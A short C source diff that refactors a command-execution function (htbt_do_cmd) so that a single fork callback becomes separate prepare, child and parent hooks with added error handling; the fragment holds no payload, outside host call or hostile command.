@@ -1285,10 +1285,20 @@ static bool htbt_do_cmd (
 		cin[1] = cout[0] = cerr[0] = -1;
 	}
 
+	if (ctx->cbset->fork.prepare != NULL &&
+		!ctx->cbset->fork.prepare(ctx->cb_ctx))
+	{
+		ret_status = PRNE_HTBT_STATUS_ERRNO;
+		ret_err = errno;
+		goto END;
+	}
+
 	to_kill = child = pth_fork();
 	if (child == 0) {
 		do { // TRY
-			if (ctx->cbset->fork != NULL && !ctx->cbset->fork(ctx->cb_ctx)) {
+			if (ctx->cbset->fork.child != NULL &&
+				!ctx->cbset->fork.child(ctx->cb_ctx))
+			{
 				break;
 			}
 
@@ -1326,7 +1336,10 @@ static bool htbt_do_cmd (
 		write(errp[1], &ret_err, sizeof(int32_t));
 		raise(SIGKILL);
 	}
-	else if (child < 0) {
+	else if (child < 0 ||
+		(ctx->cbset->fork.parent != NULL &&
+		!ctx->cbset->fork.parent(ctx->cb_ctx)))
+	{
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_err = errno;
 		goto END;
